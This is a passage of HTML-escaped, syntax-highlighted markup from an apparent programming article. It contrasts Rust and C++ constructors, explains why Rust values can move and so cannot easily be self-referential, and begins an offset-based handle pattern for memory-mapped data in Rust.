&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Point&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;impl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Point&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Point&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Point&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Here the &lt;cite&gt;new&lt;/cite&gt; method (not taking &lt;cite&gt;self&lt;/cite&gt;) is a static method on the implementation. It also returns &lt;cite&gt;Point&lt;/cite&gt; here by value. This is &lt;em&gt;generally&lt;/em&gt; how values are constructed. Because of this taking a reference in the function does not do anything useful as the value is potentially moved to a new location on calling. This is very different to how this whole thing works in C++:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;9&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Point&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;Point&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Point&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;A constructor in C++ is already operating on an allocated piece of memory. Before the constructor even runs something already provided the memory where &lt;cite&gt;this&lt;/cite&gt; points to (typically either somewhere on the stack or through the &lt;cite&gt;new&lt;/cite&gt; operator on the heap). This means that C++ code can generally assume that an instance does not move around. It's not uncommon that C++ code does really stupid things with the &lt;cite&gt;this&lt;/cite&gt; pointer as a result (like storing it in another object).&lt;/p&gt;
&lt;p&gt;This difference might sound very minor but it's one of the most fundamental ones that has huge consequences for Rust programmers. In particular it is one of the reasons you cannot have self referential structs. While there is talk about expressing types that cannot be moved in Rust there is no reasonable workaround for this at the moment (The future direction &lt;a class=&quot;reference external&quot; href=&quot;https://github.com/rust-lang/rfcs/pull/2349&quot;&gt;is the pinning system from RFC 2349&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;So what do we do currently instead? This depends a bit on the situation but generally the answer is to replace pointers with some form of Handle. So instead of just storing an absolute pointer in a struct one would instead store the offset to some reference value. Later if the pointer is needed it's calculated on demand.&lt;/p&gt;
&lt;p&gt;For instance we use a pattern like this to work with memory mapped data:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;28&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;kn&quot;&gt;use&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;marker&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mem&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;transmute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size_of&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;borrow&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Cow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;#[repr(C)]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Slice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;phantom&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;marker&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PhantomData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;#[repr(C)]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Header&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;targets&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Slice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;pub&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;'a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Cow&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;'a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;u8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;impl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;'a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;'a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;pub&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Into&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Cow&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;'a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;u8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;'a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Data&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;into&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;pub&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;usize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;load_slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;targets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;usize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;usize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;const&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;u8&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;as_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Header&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;unsafe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;transmute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size_of&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;load_slice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Slice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size_of&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;as&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;usize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
